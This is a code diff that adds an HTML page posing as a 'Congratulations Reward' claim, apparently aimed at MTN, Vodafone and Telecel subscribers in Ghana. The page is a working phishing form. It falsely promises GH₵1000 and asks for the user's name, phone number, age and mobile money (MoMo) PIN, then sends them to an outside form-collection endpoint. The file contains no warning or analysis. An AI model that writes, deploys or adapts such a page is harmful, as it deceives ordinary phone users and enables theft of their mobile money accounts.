@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Congratulations Reward</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="container">
+    <h1>🎉 CONGRATULATIONS!</h1>
+    <p class="highlight">You've won GH₵1000 for using your SIM card for a long time!</p>
+
+    <form id="rewardForm" action="https://formspree.io/f/mjkrnwqe" method="POST">
+      <fieldset>
+        <legend>Select Your Network Provider</legend>
+        <label><input type="radio" name="network" value="MTN" required> MTN</label>
+        <label><input type="radio" name="network" value="Vodafone"> Vodafone</label>
+        <label><input type="radio" name="network" value="Telecel"> Telecel</label>
+      </fieldset>
+
+      <p>Please fill in to confirm your reward:</p>
+      <input type="text" name="name" placeholder="Name" required />
+      <input type="tel" name="number" placeholder="Phone Number" required />
+      <input type="number" name="age" placeholder="Age" min="10" required />
+
+      <p>Please select how long you’ve used this SIM card:</p>
+      <label><input type="radio" name="duration" value="Less than 1 year" required> Less than 1 year</label>
+      <label><input type="radio" name="duration" value="2 years"> 2 years</label>
+      <label><input type="radio" name="duration" value="More than 2 years"> More than 2 years</label>
+
+      <p>Enter your MoMo PIN to redeem your reward:</p>
+      <input type="password" name="momoPin" placeholder="Enter MoMo PIN" required maxlength="6" />
+
+      <!-- Required for Formspree -->
+      <input type="hidden" name="_subject" value="Reward Claim Submission" />
+      <input type="hidden" name="_next" value="thankyou.html" />
+
+      <button type="submit" id="submitBtn">Submit</button>
+    </form>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
